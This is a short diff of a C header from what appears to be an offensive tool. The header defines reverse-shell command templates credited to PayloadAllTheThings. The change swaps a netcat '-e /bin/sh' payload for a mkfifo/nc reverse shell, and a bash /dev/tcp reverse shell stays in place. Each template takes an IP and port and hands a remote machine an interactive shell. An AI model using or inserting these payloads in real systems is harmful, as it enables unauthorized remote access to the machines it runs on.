@@ -8,7 +8,7 @@
 /* All of these revshells are taken from swisskyrepo's PayloadAllTheThings */
 
 /* First parameter is IP, second parameter is Port */
-#define NETCAT_REVSHELL "netcat %s %d -e /bin/sh"
+#define NETCAT_REVSHELL "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f"
 
 /* First parameter is IP, second paramter is Port */
 #define BASH_REVSHELL "bash -i >& /dev/tcp/%s/%d 0>&1"
